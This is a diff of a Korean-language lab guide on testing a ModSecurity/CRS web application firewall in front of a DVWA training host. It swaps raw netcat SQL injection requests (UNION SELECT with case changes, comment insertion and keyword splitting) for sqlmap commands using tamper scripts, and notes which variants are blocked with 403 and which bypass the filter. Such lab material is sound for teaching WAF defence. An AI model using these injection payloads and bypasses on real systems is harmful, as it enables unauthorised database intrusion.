@@ -194,11 +194,11 @@ graph TD
 
 ```bash
 # 케이스 변형 → 403 (정규화)
-echo -en "GET /?id=1%20UnIoN%20SeLeCt%20pass HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'   # 403
+ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --tamper=randomcase --level=2 --risk=2 --disable-coloring 2>&1 | grep -iE "WAF|403|blocked"'   # 케이스변형 → CRS 정규화로 403
 # 주석 키워드 '사이' → 403 (주석 제거 후 키워드 온전)
-echo -en "GET /?id=1%2F**%2FUNION%2F**%2FSELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}' # 403
+ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --tamper=space2comment --level=2 --risk=2 --disable-coloring 2>&1 | grep -iE "WAF|403|blocked"' # 주석삽입 → 403
 # 키워드 '내부' 분할 → 302 (libinjection 토큰화 실패 = 우회)
-echo -en "GET /?id=1%20UN/**/ION%20SE/**/LECT%20pass HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}' # 302
+ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --tamper=versionedmorekeywords --level=2 --risk=2 --disable-coloring 2>&1 | grep -iE "injectable|bypass|available databases"' # 키워드분할 → libinjection 토큰화 실패=우회
 ```
 
 케이스·주석사이·이중인코딩은 **403**(정규화가 표준형으로 복원해 차단), 게다가 CRS는 **이상 점수**로 약한
